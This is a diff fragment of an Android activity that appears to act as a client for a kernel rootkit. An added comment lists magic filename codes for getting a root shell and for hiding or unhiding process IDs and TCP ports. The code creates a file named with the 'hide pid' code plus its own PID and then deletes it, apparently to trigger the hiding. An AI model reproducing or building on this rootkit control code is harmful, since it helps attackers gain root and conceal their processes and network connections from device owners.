@@ -18,6 +18,15 @@ public class MainActivity extends Activity
         int myProcessID = Process.myPid();
         File yygypath = this.getFilesDir();//this.getCacheDir();
         String yygypathstr = yygypath.toString();
+        
+        /***************************************************************
+         * filename head:
+         * get root shell: 61CC7AE0
+         * hide pid: C966A01E
+         * unhide pid: 50D55DB7
+         * hide tcpv4 port: 4A6B2318
+         * unhide tcpv4 port: 7FAFD9B1
+         * ************************************************************/
         String hidename = "C966A01E";
         hidename = hidename + myProcessID;
         
@@ -31,21 +40,21 @@ public class MainActivity extends Activity
         String result = ""; 
         File file11 = new File(yygypathstr);
         File[] files = file11.listFiles(); 
-        for (File fike : files) { 
-           { 
-            result += fike.getPath() + "  "; 
-          } 
+        for (File fike : files) 
+        { 
+            result += fike.getPath() + "  ";  
         } 
-       if (result.equals("")){
-         result = "找不到文件!!"; 
-       }
+        if (result.equals(""))
+        {
+        	result = "找不到文件!!"; 
+        }
        String listresult = result;
       
-        yygypathstr = yygypathstr + "  " + listresult + " pid is " + myProcessID;
-        
-        TextView  tv = new TextView(this);
-        tv.setText(yygypathstr);
-        setContentView(tv);
+       yygypathstr = yygypathstr + "  " + listresult + " pid is " + myProcessID;
+       file.delete();
+       TextView  tv = new TextView(this);
+       tv.setText(yygypathstr);
+       setContentView(tv);
     }
     public void onDestory()
     {
